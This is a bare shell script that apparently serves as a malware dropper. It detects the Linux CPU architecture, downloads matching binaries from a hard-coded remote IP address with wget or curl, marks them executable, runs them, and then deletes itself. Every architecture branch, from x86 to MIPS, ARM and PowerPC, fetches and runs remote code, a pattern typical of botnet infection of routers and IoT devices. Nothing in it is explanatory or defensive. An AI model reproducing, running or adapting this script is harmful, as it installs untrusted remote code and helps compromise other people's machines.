#!/bin/sh
address="192.168.1.1:808"
os=`uname -s`
arch=`uname -m`
if [ $os = "Linux" ]; then
       case $arch in
       "i"*"86")
       wget -t 1 http://43.142.242.144:5551/linux_386||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_386;chmod +x linux_386;./linux_386||rm -f linux_386
       ;;
       "x86_64")
       wget -t 1 http://43.142.242.144:5551/linux_amd64||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_amd64;chmod +x linux_amd64;./linux_amd64||rm -f linux_amd64
       ;;
       "amd64")
       wget -t 1 http://43.142.242.144:5551/linux_amd64||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_amd64;chmod +x linux_amd64;./linux_amd64||rm -f linux_amd64
       ;;
       "mips")
       wget -t 1 http://43.142.242.144:5551/linux_mips||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_mips;chmod +x linux_mips;./linux_mips||rm -f linux_mips
       wget -t 1 http://43.142.242.144:5551/linux_mipsel||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_mipsel;chmod +x linux_mipsel;./linux_mipsel||rm -f linux_mipsel
       wget -t 1 http://43.142.242.144:5551/linux_mips_softfloat||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_mips_softfloat;chmod +x linux_mips_softfloat;./linux_mips_softfloat||rm -f linux_mips_softfloat
       wget -t 1 http://43.142.242.144:5551/linux_mipsel_softfloat||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_mipsel_softfloat;chmod +x linux_mipsel_softfloat;./linux_mipsel_softfloat||rm -f linux_mipsel_softfloat
       ;;
       "mips64")
       wget -t 1 http://43.142.242.144:5551/linux_mips64||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_mips64;chmod +x linux_mips64;./linux_mips64||rm -f linux_mips64
       wget -t 1 http://43.142.242.144:5551/linux_mips64el||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_mips64el;chmod +x linux_mips64el;./linux_mips64el||rm -f linux_mips64el
       wget -t 1 http://43.142.242.144:5551/linux_mips64_softfloat||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_mips64_softfloat;chmod +x linux_mips64_softfloat;./linux_mips64_softfloat||rm -f linux_mips64_softfloat
       wget -t 1 http://43.142.242.144:5551/linux_mips64el_softfloat||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_mips64el_softfloat;chmod +x linux_mips64el_softfloat;./linux_mips64el_softfloat||rm -f linux_mips64el_softfloat
       ;;
       "armv5"*)
        wget -t 1 http://43.142.242.144:5551/linux_arm5||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_arm5;chmod +x linux_arm5;./linux_arm5||rm -f linux_arm5
        ;;
       "armv6"*)
        wget -t 1 http://43.142.242.144:5551/linux_arm6||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_arm6;chmod +x linux_arm6;./linux_arm6||rm -f linux_arm6
        ;;
       "armv7"*)
        wget -t 1 http://43.142.242.144:5551/linux_arm7||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_arm7;chmod +x linux_arm7;./linux_arm7||rm -f linux_arm7
        ;;
       "armv8"*)
        wget -t 1 http://43.142.242.144:5551/linux_arm64||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_arm64;chmod +x linux_arm64;./linux_arm64||rm -f linux_arm64
       ;;
       "aarch64")
        wget -t 1 http://43.142.242.144:5551/linux_arm64||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_arm64;chmod +x linux_arm64;./linux_arm64||rm -f linux_arm64
       ;;
       "ppc"*)
        wget -t 1 http://43.142.242.144:5551/linux_ppc64||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_ppc64;chmod +x linux_ppc64;./linux_ppc64||rm -f linux_ppc64
        wget -t 1 http://43.142.242.144:5551/linux_ppc64el||curl -O --connect-timeout 10 http://43.142.242.144:5551/linux_ppc64el;chmod +x linux_ppc64el;./linux_ppc64el||rm -f linux_ppc64el
       ;;    
       esac
fi
/bin/rm $0